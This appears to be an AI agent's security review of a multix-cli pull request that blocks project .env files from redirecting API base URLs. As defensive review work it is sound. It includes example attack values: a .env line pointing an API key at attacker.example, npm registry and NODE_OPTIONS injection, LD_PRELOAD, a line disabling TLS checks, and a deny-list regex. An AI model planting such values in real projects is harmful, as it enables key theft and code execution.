# Security review: PR #97 fix(core): ignore project .env base URL overrides unless opted in

- PR: https://github.com/mrgoonie/multix-cli/pull/97, branch `fix/core-base-url-trust`, head `c2a093f`, closes #87
- Worktree read: `D:\www\oss\multix-cli\.claude\worktrees\agent-afeff06a68eb08c4d`
- Files: 13 (+309/-38). The core change is in `src/core/env-loader.ts`. Six providers were switched to `resolveBaseUrl`. Tests are in `tests/unit/core/env-loader.test.ts` (8 new). Docs changed: EN and VI environment pages, README, SKILL, `.env.example`.
- CI on the head commit: all 5 checks pass (Node 20/22 on ubuntu and windows, docs site). I did not run anything locally because the Bash tool was unavailable.
- Commit: one commit, `fix(core): ...`, with a `Closes #87` footer and **no** `BREAKING CHANGE` footer.

## Verdict

The design is right and the implementation is mostly clean. These were checked and hold:
- A shell value shadows a project value.
- HOME and USERPROFILE redirection does not work.
- Legacy files cannot carry `*_BASE_URL` or the opt-in.
- Every `*_BASE_URL` reader now uses `resolveBaseUrl`.
- The warnings show the hostname only.

**One High bypass is specific to this PR and should be fixed before merge:** on Windows, env variable names are not case-sensitive. The other High finding is pre-existing and out of scope, but it makes the docs claim ("this stops a cloned repository from redirecting your key") an overstatement. It needs a separate issue.

---

## Critical

None.

## High

### H1. Windows: a lower-case variable name in the project `.env` bypasses origin tracking, for both the base URL and the opt-in flag

`src/core/env-loader.ts:111-114` (`loadFile`), `:150-153` (`envFileOrigin`), `:164-167` (`projectBaseUrlAllowed`), `:198-200` (`resolveBaseUrl`)

On Windows, Node's `process.env` is case-insensitive: assigning `process.env.heygen_base_url` makes `process.env.HEYGEN_BASE_URL` return the same value. dotenv keeps the exact case of each key. `fileOrigins` is a plain `Map` keyed by that exact string, and lookups use the canonical upper-case name.

Failure scenario: a cloned repository has a `.env` file with:
```
heygen_base_url=https://attacker.example
```
The victim has `HEYGEN_API_KEY` in the shell or in `~/.multix/.env`, and `HEYGEN_BASE_URL` is not set in the shell.
1. `loadFile` sets `process.env["heygen_base_url"]`. On Windows this is the same variable as `HEYGEN_BASE_URL`.
2. The origin is recorded under `"heygen_base_url"`.
3. `envFileOrigin("HEYGEN_BASE_URL")` finds no record, so it returns `undefined`, and the value is treated as if it came from the shell.
4. `resolveBaseUrl` uses the attacker's URL, and the key is sent there.

There is a second variant: `multix_allow_project_base_url=1` in the project `.env` makes `projectBaseUrlAllowed()` return true, because the truthy check reads the case-insensitive env while the origin check misses the record. Every upper-case project `*_BASE_URL` is then honoured.

The only thing left is the `custom:` hostname warning on stderr. That warning is exactly the "warn only" option that #87 judged not to be enough on its own. The same bypass applies to any future caller of `envFileOrigin`.

Fix: on win32, normalise names wherever origins are recorded and looked up. Track `userFileValues` the same way.
```ts
const originKey = (n: string) => (process.platform === "win32" ? n.toUpperCase() : n);
// loadFile:        fileOrigins.set(originKey(name), { source, file, value });
// envFileOrigin:   const origin = fileOrigins.get(originKey(name));
// userFileValues:  store and look up with originKey(...)
```
Add a test that runs only on win32, using `it.runIf(process.platform === "win32")`. CI already has windows-latest runners. The test should cover a lower-case `testprov_base_url` and a lower-case opt-in flag, both in the project `.env`.

### H2. Pre-existing, outside this PR's scope: the project `.env` can still set process-level and child-process env, which is worse than a base URL redirect

`src/core/env-loader.ts:111-114` accepts every name from `cwd/.env` into `process.env`. The comment at `:73-78` already names this class of variable (`HTTPS_PROXY`, `NODE_OPTIONS`), but only the legacy layer filters it. These child processes inherit the full `process.env`, because execa's default is `extendEnv: true`:
- `src/commands/update.ts:126`: `execa(npm|pnpm|..., ["install","-g",...])`. A project `.env` setting `npm_config_registry=https://attacker` makes `multix update` install a package from the attacker's registry, which is code execution. `NODE_OPTIONS=--require ./x.js` also reaches npm, which is itself a Node process.
- `src/commands/media/ffmpeg-runner.ts:50,73`, `src/commands/media/magick-runner.ts:38`, `src/core/image-webp-finalize.ts:69,99` (cwebp): `LD_PRELOAD` and `DYLD_INSERT_LIBRARIES`, and for ImageMagick `MAGICK_CONFIGURE_PATH` (delegates.xml runs shell commands).
- In process: `NODE_TLS_REJECT_UNAUTHORIZED=0` is read lazily by `tls.connect` when a connection is made, so it disables certificate checks for every provider call. Anyone in a network position can then read every API key. I did not test this empirically here; please confirm it on Node 20 and 22.
- `src/providers/openai/codex-image-driver.ts:63-70` already uses an allowlist for the codex env, but `HOME` and `CODEX_HOME` on that list can still come from the project `.env`.

This is not a regression from #97 and should not block it. But it means the new docs line "This stops a cloned repository from redirecting your key to another host" (`docs-site/.../reference/environment.md:118`, the VI equivalent, and README:118) promises more than the loader delivers. Per AGENTS.md, open a separate issue. Suggested fix: never let the project `.env` set names that match `^(NODE_|NPM_CONFIG_|npm_config_|LD_|DYLD_|MAGICK_|HTTPS?_PROXY|ALL_PROXY|NO_PROXY|PATH$|HOME$|USERPROFILE$|CODEX_HOME$|SSL_CERT|REQUESTS_CA)` (matched case-insensitively). Better still, invert it: the project `.env` may set only multix and provider-prefixed names. Also pass an explicit sanitised `env` with `extendEnv: false` to `npm install -g`.

## Medium

### M1. Cloudflare account and gateway IDs from the project `.env` route the user's tokens through an attacker-owned AI Gateway

`src/providers/cloudflare/models.ts:47-53`, `src/providers/cloudflare/client.ts:104-116`

`videoUrl` builds `https://gateway.ai.cloudflare.com/v1/${CLOUDFLARE_ACCOUNT_ID}/${CLOUDFLARE_AI_GATEWAY_ID}/replicate/...`, and `videoHeaders` sends `Authorization: Bearer <REPLICATE_API_TOKEN>` and `cf-aig-authorization: Bearer <CLOUDFLARE_API_TOKEN>`.

Failure scenario: a project `.env` sets both IDs to the attacker's own Cloudflare account and gateway. The tokens come from the user's shell. Every `multix cloudflare video` request, including the prompt and the input image URLs, now flows through infrastructure the attacker controls and can log. The host is Cloudflare, but the tenant is the attacker. This is the same "an endpoint selector from an untrusted file" class that #87 targets, but `*_ACCOUNT_ID` and `*_GATEWAY_ID` are not `*_BASE_URL`, so they are not covered. The legacy allowlist (`env-loader.ts:79-80`) also accepts them from `.claude/.env` in the project.

Fix: when the account or gateway ID comes from the project `.env` while `CLOUDFLARE_API_TOKEN` or `REPLICATE_API_TOKEN` comes from somewhere else, apply the same rule (ignore with a warning, or require the opt-in). The simplest version: generalise `resolveBaseUrl` into a `resolveTrustedSetting(name)` helper and use it for these two names. Otherwise, log it as a follow-up issue and record the gap in the docs.

### M2. The opt-in is a permanent global switch, and the docs recommend the persistent location

`env-loader.ts:164-167`; docs at `reference/environment.md:119-121`, the VI page, README:118, `skill/SKILL.md:413`, `.env.example:30-32`

The docs suggest `MULTIX_ALLOW_PROJECT_BASE_URL=1` in `~/.multix/.env` for a "local mock server". A user who does this once turns the protection off for every repository they clone afterwards. Only the hostname warning remains. The "ignored" warning text (`env-loader.ts:203`) also tells the user to set it in `~/.multix/.env`, and a malicious repository's README can do the same.

Fix (KISS): in the docs and the warning, recommend a per-invocation shell setting (`MULTIX_ALLOW_PROJECT_BASE_URL=1 multix ...`). Explicitly warn that putting it in `~/.multix/.env` trusts every directory. Optional: accept a path value and honour it only when `cwd` is inside that path.

### M3. A breaking behaviour change shipped as a patch with no migration note

The only commit is `fix(core): ...` with no `BREAKING CHANGE:` footer, so release-please will cut a patch release. The PR body has no migration section.

Failure scenario: a user or CI job keeps a mock server URL in the project `.env` (`REPLICATE_BASE_URL=http://127.0.0.1:...`) and a real key in the shell. After the upgrade, the request goes to the real paid vendor with the real key. A warning is printed, but the call still goes out and is billed. That is the opposite of what the user configured.

Fix: add a `BREAKING CHANGE:` footer (or use `fix(core)!:`) so the changelog flags it, and add a one-line migration note to the PR and the docs. Also consider failing closed: throw a `ConfigError` when a project override is ignored and there is no user-level value, instead of silently falling back to the vendor default. The user then sees that a request was redirected before any key or quota is spent.

## Low

### L1. An empty project value silently overrides the user-level base URL

`env-loader.ts:198-200`. When the project `.env` has `HEYGEN_BASE_URL=` (empty or whitespace), `process.env` holds `""`. Because the project file loads first, the user file's value is skipped and only lands in `userFileValues`. `value` becomes `undefined`, the `origin.source === "project"` branch is skipped, and the function returns the vendor default with no warning.

A user who routes through a corporate or regional proxy in `~/.multix/.env` has it bypassed by a repository with no warning. The key goes to the legitimate vendor, so this is not exfiltration, but it is a silent policy bypass.

Fix: check the origin before the emptiness check. When the origin is `project` and the opt-in is not set, always use `userFileValues[name]`, whatever the raw value.

### L2. No scheme check outside HeyGen

`resolveBaseUrl` accepts `http://` for fal, Leonardo, BytePlus, Replicate and Atlas Cloud. Only HeyGen runs `checkBaseUrl` (`heygen/node-helpers.ts:57`). Once the opt-in is enabled (see M2), a project `.env` with `http://<lan-host>` sends keys in cleartext. Fix: move the HeyGen https-or-loopback rule into `resolveBaseUrl` so every provider gets it.

### L3. Test gaps

`tests/unit/core/env-loader.test.ts:170-292`. Isolation is fine: VARS are saved and restored, `cwd` and `homedir` are mocked, temp dirs are removed, and `MULTIX_DISABLE_HOME_ENV` is deleted and then restored. Missing tests:
- the case-variant names from H1 (win32)
- empty project value combined with a user value (L1)
- a URL with userinfo and a port (`https://u:p@host:8443/x`), to pin down the claim that the warning contains the hostname only
- the opt-in coming from the legacy layer (it should be rejected; today the regex rejects it implicitly)

### L4. Docs wording

"Prints one warning per run" (EN `environment.md:122-123`) is really one warning per variable. When a project value falls back to a user value, two warnings print: "ignored" and "custom host". This is minor. Also soften the claim at `:118` to match H2 and M1.

## Verified non-issues (evidence)

- **A project `.env` sets HOME or USERPROFILE to redirect the "user-level" file:** `home` is computed at `env-loader.ts:129`, before the project file loads at `:132`. Not exploitable. `check.ts:180` reads `os.homedir()` after loading, but only for an informational listing.
- **A project `.env` sets `MULTIX_DISABLE_HOME_ENV`:** it is read at `:129`, also before the project load.
- **The variable is also in the shell:** `loadFile` skips names already in `process.env` (`:112`), so there is no origin record and the shell value wins. Correct.
- **Legacy `.claude` files (project or home):** they are classified as `"legacy"`. The allowlist regex at `:79-80` rejects `*_BASE_URL` and `MULTIX_ALLOW_PROJECT_BASE_URL`, so they cannot set either. Classification is adequate for this PR. The Cloudflare ID exposure through this layer is covered in M1.
- **Parent-directory `.env` files or a `MULTIX_ENV_FILE`-style override:** neither exists. Only `cwd/.env` is read (`:132`), and dotenv is used only through `parse`.
- **Runtime mutation:** `envFileOrigin` returns `undefined` when the value has changed since loading (`:152`). That is the conservative direction, because only a runtime writer can cause it.
- **Coverage:** every `*_BASE_URL` in `src/` goes through `resolveBaseUrl` (Atlas, BytePlus, fal, HeyGen, Leonardo, Replicate). The base URLs for Gemini, OpenAI, OpenRouter, ElevenLabs, MiniMax and Cloudflare are hard-coded constants. `OPENROUTER_SITE_URL` is only a Referer header.
- **Warning leakage:** `hostOf` uses `URL.hostname`, so no port, userinfo, path or query is shown, and an unparseable value prints `(unparseable URL)`. The "ignored" warning shows the variable name and the local file path, never the value. Output goes through `console.warn` to stderr, so stdout and JSON output are unaffected.
- **Timing:** `loadEnv()` runs at `cli.ts:7` before any command, and `resolveBaseUrl` runs lazily when a client is constructed.

## Recommended actions (ordered)

1. Fix H1 (case-insensitive origin keys on win32) and add a win32 test. This blocks the merge.
2. M3: add a `BREAKING CHANGE` footer and a migration note; consider failing closed when an override is ignored.
3. M2: change the docs and warning text to recommend a per-invocation shell opt-in and warn about the global effect.
4. L1: decide the fallback based on origin, not emptiness.
5. Open follow-up issues for H2 (project `.env` env-injection into child processes and TLS) and M1 (Cloudflare account and gateway IDs). Soften the docs claim until those are fixed.
6. L2 and L3 when convenient.

## Plan follow-up

Issue #87's options are covered: project values are refused, a hostname warning is shown, and there is an explicit opt-in. The named scope (env-loader, provider helpers, EN and VI docs, tests) is done. #87 should stay `in review` until H1 is fixed.

## Unresolved questions

- Does undici's TLS path on Node 20 and 22 honour a runtime-set `NODE_TLS_REJECT_UNAUTHORIZED=0`? (affects how severe H2 is)
- Product decision: should the opt-in be global, or scoped to a path?
- Does a gateway owner's Cloudflare AI Gateway log retain the upstream `Authorization` header, or only the payloads? (affects how severe M1 is)

Status: DONE_WITH_CONCERNS
Summary: Request changes. The design is sound, but there is a Windows case-insensitivity bypass of the origin tracking (H1). Findings: Critical 0, High 2 (one PR-specific blocker, one pre-existing out-of-scope), Medium 3, Low 4.
